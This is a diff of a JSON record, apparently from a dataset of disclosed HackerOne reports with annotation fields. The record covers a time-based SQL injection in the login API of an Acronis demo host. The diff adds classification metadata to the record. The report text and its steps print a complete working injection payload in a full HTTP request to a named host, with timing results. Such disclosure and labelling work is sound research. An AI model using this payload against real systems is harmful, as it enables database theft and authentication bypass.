@@ -1,42 +1,46 @@
 {
-    "reported_to": "Acronis",
-    "reported_by": "mmg ",
-    "title": "SQL injection in https://demor.adr.acronis.com/ via the username parameter",
-    "content": "\nI have discovered a SQL injection in https://demor.adr.acronis.com/ using the POST request via the username parameter.\nUsing the Repearter in Burpsuite I have submitted the following POST request:\nPOST /ng/api/auth/login HTTP/2\nHost: demor.adr.acronis.com\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nReferer: https://demor.adr.acronis.com/\nCookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Encoding: gzip,deflate,br\nContent-Length: 148\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36\n{\"username\":\"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z\",\"id\":\"27\",\"password\":\"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956\"}\nWhich resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).\nUsing various values for the sleep function you get various time responses.\n0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336\n0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332\n0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352\n0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327\n0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337\nI have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.\nImpact\nAn attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database.\nThis can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Acronis",
+  "reported_by": "mmg ",
+  "title": "SQL injection in https://demor.adr.acronis.com/ via the username parameter",
+  "content": "\nI have discovered a SQL injection in https://demor.adr.acronis.com/ using the POST request via the username parameter.\nUsing the Repearter in Burpsuite I have submitted the following POST request:\nPOST /ng/api/auth/login HTTP/2\nHost: demor.adr.acronis.com\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nReferer: https://demor.adr.acronis.com/\nCookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Encoding: gzip,deflate,br\nContent-Length: 148\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36\n{\"username\":\"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z\",\"id\":\"27\",\"password\":\"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956\"}\nWhich resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).\nUsing various values for the sleep function you get various time responses.\n0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336\n0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332\n0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352\n0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327\n0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337\nI have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.\nImpact\nAn attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database.\nThis can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1724850060,
+  "report_url": "https://hackerone.com/reports/1436751",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Intercept the login request to https://demor.adr.acronis.com/ng/api/auth/login using a tool like Burp Suite."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "SQL Injection"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1724850060,
-    "report_url": "https://hackerone.com/reports/1436751",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Intercept the login request to https://demor.adr.acronis.com/ng/api/auth/login using a tool like Burp Suite."
-        ],
-        [
-            2,
-            "Modify the 'username' parameter in the POST request to include a SQL injection payload such as: {\"username\":\"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z\",\"id\":\"27\",\"password\":\"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956\"}"
-        ]
-    ],
-    "vuln_description": "The vulnerability is a SQL injection in the login endpoint of the application, where the 'username' parameter is not properly sanitized. This allows an attacker to execute arbitrary SQL commands, leading to potential authentication bypass, data leakage, or even remote code execution.",
-    "reason": "The attack involves a straightforward SQL injection technique using time-based delays to confirm the vulnerability. It does not require complex interactions or understanding of multiple components, making it relatively easy to discover for someone familiar with SQL injection techniques.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The SQL injection vulnerability is not directly related to authentication or authorization bypass via session or resource manipulation, but rather involves injecting malicious SQL queries through input parameters. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, which does not apply to SQL injection detection.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Modify the 'username' parameter in the POST request to include a SQL injection payload such as: {\"username\":\"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z\",\"id\":\"27\",\"password\":\"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956\"}"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a SQL injection in the login endpoint of the application, where the 'username' parameter is not properly sanitized. This allows an attacker to execute arbitrary SQL commands, leading to potential authentication bypass, data leakage, or even remote code execution.",
+  "reason": "The attack involves a straightforward SQL injection technique using time-based delays to confirm the vulnerability. It does not require complex interactions or understanding of multiple components, making it relatively easy to discover for someone familiar with SQL injection techniques.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves manipulating the username parameter in a POST request to trigger time-based delays, which is a form of input validation bypass rather than an authentication or authorization boundary crossing. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting input validation flaws like SQL injection.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The SQL injection described in the report uses time-based payloads (e.g., sleep(35)) injected into the username parameter. The proposed methodology involves testing parameters with simple payloads, including common permutations. Time-based SQLi payloads like sleep() are standard and detectable via same-channel HTTP response delays. Since the payloads do not require custom filter bypasses and the delay is observable in the HTTP response (same channel), this vulnerability aligns with the methodology's 'simple payload' criteria.",
+    "is_simple_injection": true
+  }
 }
